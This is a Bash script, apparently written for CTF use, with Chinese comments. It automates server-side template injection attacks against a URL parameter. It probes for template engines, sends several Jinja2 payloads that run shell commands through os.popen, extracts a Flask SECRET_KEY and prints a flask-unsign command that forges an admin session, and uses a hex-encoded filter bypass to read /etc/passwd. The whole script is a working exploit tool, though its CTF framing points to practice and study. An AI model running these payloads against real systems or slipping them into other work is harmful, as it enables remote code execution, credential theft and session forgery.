#!/bin/bash
# CTF SSTI模板注入检测
# 用法: bash ssti.sh <URL> [PARAM]

URL="${1:?用法: bash ssti.sh <URL> [PARAM]}"
PARAM="${2:-name}"

echo "=========================================="
echo "  SSTI模板注入检测: $URL"
echo "=========================================="

urlencode() { /usr/bin/python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }

echo -e "\n[1/4] 模板引擎检测"
declare -A payloads
payloads["{{7*7}}"]="49"
payloads['${7*7}']="49"
payloads["<%= 7*7 %>"]="49"
payloads['#{7*7}']="49"
payloads['*{7*7}']="49"

for payload in "${!payloads[@]}"; do
    expected="${payloads[$payload]}"
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -q "$expected"; then
        echo -e "  \033[31m[!] SSTI确认! Payload: $payload\033[0m"
        break
    fi
done

echo -e "\n[2/4] RCE Payload (Jinja2)"
RCE_PAYLOADS=(
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    "{{lipsum.__globals__['os'].popen('id').read()}}"
    "{{cycler.__init__.__globals__.os.popen('id').read()}}"
    "{{joiner.__init__.__globals__.os.popen('id').read()}}"
    "{{namespace.__init__.__globals__.os.popen('id').read()}}"
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
)
for payload in "${RCE_PAYLOADS[@]}"; do
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    if echo "$resp" | grep -qE "(uid=|root|www-data)"; then
        echo -e "  \033[31m[!!!] RCE成功!\033[0m"
        echo "$resp" | grep -oE "uid=[0-9]+.*" | head -1
        break
    fi
done

echo -e "\n[3/4] Flask SECRET_KEY提取"
KEY_PAYLOADS=(
    "{{config.SECRET_KEY}}"
    "{{config.items()}}"
)
for payload in "${KEY_PAYLOADS[@]}"; do
    encoded=$(urlencode "$payload")
    resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
    key=$(echo "$resp" | grep -oP "[a-f0-9]{16,64}" | head -1)
    if [ -n "$key" ]; then
        echo -e "  \033[31m[!] SECRET_KEY: $key\033[0m"
        echo "  伪造session: flask-unsign --sign --cookie \"{'role':'admin'}\" --secret '$key'"
        break
    fi
done

echo -e "\n[4/4] 黑名单绕过"
# Unicode/Hex编码绕过
bypass="{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')|list|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(2)|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()|list|attr('\\x5f\\x5fgetitem\\x5f\\x5f')(40)('/etc/passwd')|attr('read')()}}"
encoded=$(urlencode "$bypass")
resp=$(curl -sk "$URL?$PARAM=$encoded" --max-time 5 2>/dev/null)
if echo "$resp" | grep -qE "(root:|/bin/bash)"; then
    echo -e "  \033[31m[!] 绕过成功!\033[0m"
fi

echo -e "\n=========================================="
echo "SSTI检测完成"
echo "=========================================="
